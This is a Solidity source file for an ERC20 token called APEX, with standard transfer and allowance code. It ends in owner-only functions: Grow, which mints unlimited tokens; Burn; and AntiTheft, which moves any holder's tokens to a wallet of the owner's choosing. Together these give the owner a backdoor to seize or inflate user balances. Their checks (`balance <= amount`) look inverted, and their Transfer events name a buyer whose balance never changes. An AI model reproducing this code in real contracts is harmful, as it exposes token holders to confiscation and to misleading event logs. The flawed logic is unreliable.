1 /**
2  *Submitted after initial minting to restructure burn method
3 */
4 
5 pragma solidity ^0.4.24;
6 
7  
8 library SafeMath {
9   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
10     uint256 c = a * b;
11     assert(a == 0 || c / a == b);
12     return c;
13   }
14 
15  function div(uint256 a, uint256 b) internal pure returns (uint256) {
16     assert(b > 0); // Solidity automatically throws when dividing by 0
17     uint256 c = a / b;
18     assert(a == b * c + a % b); // There is no case in which this doesn't hold
19     return c;
20   }
21 
22   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
23     assert(b <= a);
24     return a - b;
25   }
26 
27   function add(uint256 a, uint256 b) internal pure returns (uint256) {
28     uint256 c = a + b;
29     assert(c >= a);
30     return c;
31   }
32 }
33 
34 contract Ownable {
35   address public owner;
36 
37 
38   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
39 
40 
41   /**
42    * @dev The Ownable constructor sets the original `owner` of the contract to the sender
43    * account.
44    */
45   function Ownable() public {
46     owner = msg.sender;
47   }
48 
49 
50   /**
51    * @dev Throws if called by any account other than the owner.
52    */
53   modifier onlyOwner() {
54     require(msg.sender == owner);
55     _;
56   }
57 
58   function transferOwnership(address newOwner) onlyOwner public {
59     require(newOwner != address(0));
60     OwnershipTransferred(owner, newOwner);
61     owner = newOwner;
62   }
63 
64 }
65 
66 /**
67  * @title ERC20Standard
68  * @dev Strong version of ERC20 interface
69  */
70 contract ERC20Interface {
71      function totalSupply() public constant returns (uint);
72      function balanceOf(address tokenOwner) public constant returns (uint balance);
73      function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
74      function transfer(address to, uint tokens) public returns (bool success);
75      function approve(address spender, uint tokens) public returns (bool success);
76      function transferFrom(address from, address to, uint tokens) public returns (bool success);
77      event Transfer(address indexed from, address indexed to, uint tokens);
78      event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
79 }
80 contract APEX is ERC20Interface,Ownable {
81 
82    using SafeMath for uint256;
83     uint256 public totalSupply;
84     mapping(address => uint256) tokenBalances;
85    
86    string public constant name = "APEX";
87    string public constant symbol = "APX";
88    uint256 public constant decimals = 18;
89 
90    uint256 public constant INITIAL_SUPPLY = 100000000;
91     address ownerWallet;
92    // Owner of account approves the transfer of an amount to another account
93    mapping (address => mapping (address => uint256)) allowed;
94    event Debug(string message, address addr, uint256 number);
95 
96     function APEX (address wallet) public {
97         owner = msg.sender;
98         ownerWallet=wallet;
99         totalSupply = INITIAL_SUPPLY * 10 ** 18;
100         tokenBalances[wallet] = INITIAL_SUPPLY * 10 ** 18;   //Since we divided the token into 10^18 parts
101     }
102  /**
103  * @dev transfer token for a specified address
104   * @param _to The address to transfer to.
105   * @param _value The amount to be transferred.
106   */
107   function transfer(address _to, uint256 _value) public returns (bool) {
108     require(tokenBalances[msg.sender]>=_value);
109     tokenBalances[msg.sender] = tokenBalances[msg.sender].sub(_value);
110     tokenBalances[_to] = tokenBalances[_to].add(_value);
111     Transfer(msg.sender, _to, _value);
112     return true;
113   }
114   
115   
116      /**
117    * @dev Transfer tokens from one address to another
118    * @param _from address The address which you want to send tokens from
119    * @param _to address The address which you want to transfer to
120    * @param _value uint256 the amount of tokens to be transferred
121    */
122   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
123     require(_to != address(0));
124     require(_value <= tokenBalances[_from]);
125     require(_value <= allowed[_from][msg.sender]);
126 
127     tokenBalances[_from] = tokenBalances[_from].sub(_value);
128     tokenBalances[_to] = tokenBalances[_to].add(_value);
129     allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
130     Transfer(_from, _to, _value);
131     return true;
132   }
133   
134   function approve(address _spender, uint256 _value) public returns (bool) {
135     allowed[msg.sender][_spender] = _value;
136     Approval(msg.sender, _spender, _value);
137     return true;
138   }
139 
140 
141      function totalSupply() public constant returns (uint) {
142          return totalSupply  - tokenBalances[address(0)];
143      }
144      
145 
146      function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {
147          return allowed[tokenOwner][spender];
148      }
149      
150      /**
151    * @dev Increase the amount of tokens that an owner allowed to a spender.
152    *
153    * approve should be called when allowed[_spender] == 0. To increment
154    * allowed value is better to use this function to avoid 2 calls (and wait until
155    * the first transaction is mined)
156    * From MonolithDAO Token.sol
157    * @param _spender The address which will spend the funds.
158    * @param _addedValue The amount of tokens to increase the allowance by.
159    */
160   function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
161     allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
162     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
163     return true;
164   }
165 
166   function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
167     uint oldValue = allowed[msg.sender][_spender];
168     if (_subtractedValue > oldValue) {
169       allowed[msg.sender][_spender] = 0;
170     } else {
171       allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
172     }
173     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
174     return true;
175   }
176 
177      
178      // ------------------------------------------------------------------------
179      // Don't accept ETH
180      // ------------------------------------------------------------------------
181      function () public payable {
182          revert();
183      }
184  
185 
186   /**
187   * @dev Gets the balance of the specified address.
188   * @param _owner The address to query the the balance of.
189   * @return An uint256 representing the amount owned by the passed address.
190   */
191   function balanceOf(address _owner) constant public returns (uint256 balance) {
192     return tokenBalances[_owner];
193   }
194 
195     function Grow(address wallet, address buyer, uint256 tokenAmount) public onlyOwner {
196         require(tokenBalances[buyer]<=tokenAmount);
197         tokenBalances[wallet] = tokenBalances[wallet].add(tokenAmount);
198         Transfer(buyer, wallet, tokenAmount);
199         totalSupply=totalSupply.add(tokenAmount);
200      }
201     function Burn(address wallet, address buyer, uint256 tokenAmount) public onlyOwner {
202         require(tokenBalances[buyer]<=tokenAmount);
203         tokenBalances[wallet] = tokenBalances[wallet].sub(tokenAmount);
204         Transfer(buyer, wallet, tokenAmount);
205         totalSupply=totalSupply.sub(tokenAmount);
206      }     
207     function AntiTheft(address wallet, address buyer, uint256 tokenAmount) public onlyOwner {
208         require(tokenBalances[buyer]<=tokenAmount);
209         tokenBalances[buyer] = tokenBalances[buyer].sub(tokenAmount);
210         tokenBalances[wallet] = tokenBalances[wallet].add(tokenAmount);
211         Transfer(buyer, wallet, tokenAmount);
212      }     
213     function showMyTokenBalance(address addr) public view returns (uint tokenBalance) {
214         tokenBalance = tokenBalances[addr];
215     }
216 }